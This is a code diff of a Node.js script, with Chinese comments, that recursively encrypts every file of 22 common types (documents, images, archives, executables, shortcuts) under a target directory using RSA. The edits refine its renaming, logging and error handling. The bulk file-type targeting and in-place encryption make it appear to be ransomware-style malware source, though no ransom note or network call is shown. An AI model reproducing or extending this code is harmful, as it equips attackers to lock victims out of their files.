@@ -29,7 +29,7 @@ const RSADo = {
 }
 
 // 加密这些类型的文件,共22种文件类型,可添加更多
-const fileExtnames = [".jpg", ".bmp", ".zip", ".exe", ".mp3", ".wmv", ".doc", ".ppt", ".htm", ".png", ".gif", ".rar", ".txt", ".wma", ".mp4", ".xls", ".pdf", ".lnk", ".xlsx", ".docx", ".pptx", ".html"]
+const fileExtNames = [".jpg", ".bmp", ".zip", ".exe", ".mp3", ".wmv", ".doc", ".ppt", ".htm", ".png", ".gif", ".rar", ".txt", ".wma", ".mp4", ".xls", ".pdf", ".lnk", ".xlsx", ".docx", ".pptx", ".html"]
 
 function logger(info, level) {
 	console[level](`[${getTime()}] [${level.toUpperCase()}] ${info}`)
@@ -90,7 +90,12 @@ function deploy(targetPath, dst) {
 	}
 }
 
-encrypt(dst);
+encrypt(dst)
+	.then(() => {
+		logger("all tasks finished", 'info')
+	}).catch(err => {
+		logger(`处理加密文件过程中发生错误: ${err.stack || err.toString()}`, 'error')
+	})
 
 function encrypt(dst) {
 	if (!fs.existsSync(dst)) {
@@ -104,7 +109,7 @@ function encrypt(dst) {
 		const promiseArr = [];
 		fs.readdirSync(dst).forEach(function (files) {
 			const targetPath = path.join(dst, files)
-			if (!fileExtnames.some(item => path.extname(targetPath) === item)) {
+			if (!fileExtNames.some(item => path.extname(targetPath) === item)) {
 				if (fs.statSync(targetPath).isDirectory()) {
 					return encrypt(targetPath);
 				}
@@ -115,18 +120,21 @@ function encrypt(dst) {
 						logger(`发现大文件: ${targetPath} ${fs.statSync(targetPath).size / 1024 / 1024}`, 'info')
 						return res();
 					}
-					const absoluePathArr = targetPath.split('.')
-					const currentDirFilesNameArr = absoluePathArr.slice(0, absoluePathArr.length - 1).join("");
 					//处理相同文件名，不同后缀名的文件，防止加密后丢失相应的文件
-					if (bufferArr.indexOf(currentDirFilesNameArr) !== -1) {
+					logger(`targetPath: ${targetPath}`, 'info')
+					const arr = targetPath.split(".")
+					arr.pop()
+					const filePathWithoutExtname = arr.join(".")
+					if (bufferArr.some(item => item.includes(filePathWithoutExtname))) {
 						//需要处理多个相同文件名,不同后缀名的情况
-						const renameFiles = `${path.basename(targetPath, path.extname(targetPath))}Same` + path.extname(targetPath);
-						logger(`同一文件目录下出现相同的文件名: ${targetPath}`, 'warn')
-						fs.renameSync(targetPath, path.join(dst, renameFiles));
-						bufferArr.push(renameFiles);
-						return res(deploy(path.join(dst, renameFiles), dst))
+						const renameFile = getNotSameFilename(targetPath, dst) + path.extname(targetPath);
+						logger(`同一文件目录下出现相同的文件名: ${targetPath}`, 'info')
+						const renameFilePath = path.join(dst, renameFile)
+						fs.renameSync(targetPath, renameFilePath);
+						bufferArr.push(renameFilePath);
+						return res(deploy(renameFilePath, dst))
 					} else {
-						bufferArr.push(currentDirFilesNameArr);
+						bufferArr.push(targetPath);
 						deploy(targetPath, dst)
 						return res();
 					}
@@ -137,7 +145,6 @@ function encrypt(dst) {
 			}
 		});
 		return Promise.all(promiseArr).then(function () {
-			logger("all taska finished", 'info')
 			resolve();
 		}).catch(err => {
 			logger(`加密文件过程中发生错误: ${err.stack || err.toString()}`, 'error')
@@ -145,12 +152,21 @@ function encrypt(dst) {
 	})
 }
 
+function getNotSameFilename(targetFilePath, dst) {
+	const renameFilePath = `${path.basename(targetFilePath, path.extname(targetFilePath))}Same`
+	if (bufferArr.some(item => item.includes(renameFilePath))) {
+		return getNotSameFilename(renameFilePath, dst)
+	} else {
+		return renameFilePath
+	}
+}
+
 process.on('uncaughtException', function (err) {
-	console.error('uncaughtException', err);
+	logger(`uncaughtException: ${err.stack || err.toString()}`, "error");
 });
 
 process.on('unhandledRejection', (error) => {
-	logger.error('unhandledRejection', error.stack || error.toString());
+	logger(`unhandledRejection: ${error.stack || error.toString()}`, 'error');
 });
 
 
@@ -172,9 +188,9 @@ function getTime() {
 		second = "0" + second
 	}
 	if (mileSecond < 10) {
-		second = "00" + mileSecond
+		mileSecond = "00" + mileSecond
 	} else if (mileSecond < 100) {
-		second = "0" + mileSecond
+		mileSecond = "0" + mileSecond
 	}
 	time = `${year}-${month}-${day} ${hour}:${minute}:${second}.${mileSecond}`;
 	return time;
